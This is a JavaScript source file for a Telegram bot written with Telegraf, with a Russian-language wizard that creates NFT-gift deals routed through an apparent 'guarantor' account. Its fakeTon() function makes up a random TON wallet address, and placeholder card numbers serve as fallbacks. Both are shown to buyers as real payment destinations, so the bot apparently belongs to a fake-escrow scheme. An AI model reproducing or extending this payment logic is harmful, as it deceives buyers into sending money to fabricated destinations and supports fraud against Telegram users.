import { Scenes } from 'telegraf'
import db from '../db.js'
import { nanoid, customAlphabet } from 'nanoid'
import { currencyKb, dealCreateKb, sellerGiftKb } from '../keyboards.js'

// 5-символьный код
const alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
const dealCode = customAlphabet(alphabet, 5)

function now() {
  return new Date().toLocaleString('ru-RU', { hour12: false })
}

function fakeTon() {
  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
  let s = 'UQ'
  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
  return s
}

function detectRubType(val = '') {
  const v = (val || '').replace(/\s+/g, '')
  const looksLikeCard = /^\d{16,19}$/.test(v)
  const looksLikePhone = /^(\+7|7|8)\d{10}$/.test(v)
  return looksLikeCard ? 'card' : (looksLikePhone ? 'phone' : null)
}

export const createDealWizard = new Scenes.WizardScene(
  'create-deal',

  // 0: Валюта
  async (ctx) => {
    try { await ctx.deleteMessage() } catch {}
    ctx.wizard.state.data = { sellerId: ctx.from.id, nftLinks: [] }
    await ctx.reply('Выберите валюту сделки:', currencyKb())
    return ctx.wizard.next()
  },

  // 1: NFT ссылки
  async (ctx) => {
    if (ctx.callbackQuery) {
      try { await ctx.answerCbQuery() } catch {}
      try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
    }
    const cb = ctx.callbackQuery?.data
    if (!cb?.startsWith('cur:')) return
    const currency = cb.split(':')[1]
    ctx.wizard.state.data.currency = currency

    await ctx.reply(
      'Вставьте ссылку на NFT подарок(и). Можно несколько — по одной.\n' +
      'Пример: https://t.me/nft/PlushPepe-2790\n\n' +
      'Когда закончите — напишите: ГОТОВО'
    )
    return ctx.wizard.next()
  },

  // 2: сбор NFT ссылок
  async (ctx) => {
    const t = (ctx.message?.text || '').trim()
    if (!t) return
    if (t.toLowerCase() === 'готово') {
      await ctx.reply('Введите сумму сделки (число):')
      return ctx.wizard.next()
    }
    ctx.wizard.state.data.nftLinks.push(t)
    await ctx.reply('✅ Принято! Ещё ссылку или напишите ГОТОВО.')
  },

  // 3: сумма
  async (ctx) => {
    const amount = Number((ctx.message?.text || '').replace(',','.'))
    if (!isFinite(amount) || amount <= 0) {
      await ctx.reply('Введите корректное число.')
      return
    }
    ctx.wizard.state.data.amount = amount
    await ctx.reply('Введите «суть сделки»:')
    return ctx.wizard.next()
  },

  // 4: финал — создаём сделку
  async (ctx) => {
    const d = ctx.wizard.state.data
    d.summary = (ctx.message?.text || '').trim()
    d.id = nanoid(10)
    d.code = dealCode()
    d.token = nanoid(8)
    d.status = 'waiting_gift' // сначала ждём подарок гаранту
    d.createdAt = Date.now()
    d.log = [`${now()} — сделка создана продавцом; ожидание подарка гаранту @GiftSecureSupport`]

    await db.read()
    db.data.deals[d.id] = d
    await db.write()

    const seller = db.data.users[d.sellerId] || {}
    const w = seller.wallets || {}

    // превью того, что увидит покупатель (платёжная часть) после подтверждений
    let payLine = ''
    if (d.currency === 'TON') {
      const addr = w.TON || fakeTon()
      payLine = `Покупателю будет показано: отправьте *${d.amount} TON* на адрес \`${addr}\`.`
    } else if (d.currency === 'RUB') {
      const rub = (w.RUB || '').trim()
      const t = detectRubType(rub)
      if (t === 'phone') {
        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *номер телефона* \`${rub}\`.`
      } else {
        const card = rub || '2200 1234 5678 9012'
        payLine = `Покупателю будет показано: отправьте *${d.amount} RUB* на *карту* \`${card}\`.`
      }
    } else if (d.currency === 'UAH') {
      const card = (w.UAH || '5375 1234 5678 9012').trim()
      payLine = `Покупателю будет показано: отправьте *${d.amount} UAH* на *карту* \`${card}\`.`
    } else if (d.currency === 'STARS') {
      payLine =
        `Покупателю будет показано: оплатите *${d.amount} Stars* через *Fragment* ` +
        `(https://fragment.com) или *подарками*. _Комиссия на покупателе._`
    }

    // deeplink
    let botName = process.env.BOT_USERNAME
    if (!botName) {
      try {
        const me = await ctx.telegram.getMe()
        botName = me?.username || null
        if (botName) process.env.BOT_USERNAME = botName
      } catch {}
    }
    const link = botName ? `https://t.me/${botName}?start=${d.token}` : '(ошибка имени бота)'

    try { await ctx.deleteMessage() } catch {}

    await ctx.reply(
`✅ Сделка создана!

🔖 Код: ${d.code}
💰 Сумма: ${d.amount} ${d.currency}
🧧 NFT:
${(d.nftLinks || []).join('\n')}

📜 Описание: ${d.summary}

🎁 Статус: *Ожидание подарка гаранту* @GiftSecureSupport

🔗 Ссылка для покупателя:
${link}

${payLine}

Когда отправите подарок гаранту, нажмите «Подарок отправлен».`,
      { parse_mode: 'Markdown', ...sellerGiftKb(d.token) }
    )

    return ctx.scene.leave()
  }
)